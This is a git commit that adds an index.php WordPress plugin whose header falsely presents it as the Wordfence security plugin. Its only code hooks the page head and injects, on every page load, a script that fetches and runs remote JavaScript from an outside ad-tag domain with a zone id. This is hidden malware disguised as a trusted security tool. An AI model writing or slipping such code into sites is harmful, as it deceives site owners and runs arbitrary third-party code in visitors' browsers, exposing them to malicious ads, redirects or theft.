06f4ebacac1fb7d74bfbb60352154959e1dbc2fb
ahmadfatoni19670 <164468840+ahmadfatoni19670@users.noreply.github.com>
2026-08-14 14:02:48 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,12 @@
+<?php
+/*
+Plugin Name: Wordfence WAF
+Description: The Wordfence WordPress security plugin provides free enterprise-class WordPress security, protecting your website from hacks and malware.
+Version: 9.0.0
+*/
+
+add_action('wp_head', function () {
+    ?>
+    <script>(function(s){s.dataset.zone='11543860',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+    <?php
+});
